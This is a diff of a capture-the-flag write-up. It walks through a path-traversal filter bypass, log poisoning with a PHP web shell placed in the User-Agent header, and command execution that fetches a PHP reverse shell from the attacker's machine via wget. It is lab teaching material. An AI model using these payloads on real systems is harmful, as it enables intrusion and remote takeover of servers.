@@ -44,14 +44,36 @@ let us try and change **mrrobot.php** to **test.php**. And we can see some more 
 
 And we can get a flag but also we can see some php filters on it.
 # Acesslog
-Okay so the filter dictates that using **../..** which we can easily bypasss by using **..//..**.
+Okay so the filter dictates that using **../..** which we can easily bypasss by using **..//..**
+
 Next let us try and view the access log using the bypass.
+
 ![](https://i.ibb.co/f98gBfQ/accesslog.png)
 
 So next we can try and pass some malicious code to the user agent. **<?php system($_GET['cmd']); ?>**.
 So to do this follow this steps.
 
- 1. right click and press Inspect on the dropdown menu
+ 1. right click and press Inspect on the dropdown menu.
+ 2. click on the Network option and reload the page
+ 3. Hit resend.
+ 4. scroll to the user agent and replace with the malicious code.
+ 5. Hit send.
+
+Smooth so next up let us try and execute some commands on it.
+let us try and add **&cmd=ls** to the end of the url.
+
+![](https://i.ibb.co/WWmnG2H/cmd-ls.png)
+
+We can actually run commands on it. so next let us try and get a reverse shell.
+
+# SHELL
+So we are going to get a sample php reverseshell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+Next we are going to set up a python server on our machine. 
+Next we are going to run **&cmd=wget http://ip/revshell.php**
+We should be able to get a 200 code on our machin e.
+![](https://i.ibb.co/4jKLJfz/httpserver.png)
+
+next start up a listener on your machine
 
 
 
